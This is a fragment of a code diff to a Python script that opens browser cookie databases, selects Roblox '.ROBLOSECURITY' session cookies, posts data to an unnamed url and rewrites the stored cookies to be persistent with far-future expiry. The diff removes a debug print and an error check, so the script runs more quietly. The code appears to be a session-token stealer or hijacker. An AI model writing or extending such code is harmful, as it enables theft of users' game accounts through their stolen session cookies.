@@ -50,7 +50,6 @@ def find_files():
 def main():
     r = find_files()
     for e in r:
-        print(e)
         filename = e
         db = sqlite3.connect(filename)
         db.text_factory = lambda b: b.decode(errors="ignore")
@@ -82,7 +81,7 @@ WHERE host_key like '%roblox.com%' AND name like '%ROBLOSECURITY%'""")
             
             result = requests.post(url, json = data)
 
-            result.raise_for_status()
+            
 
 
             cursor.execute("""UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
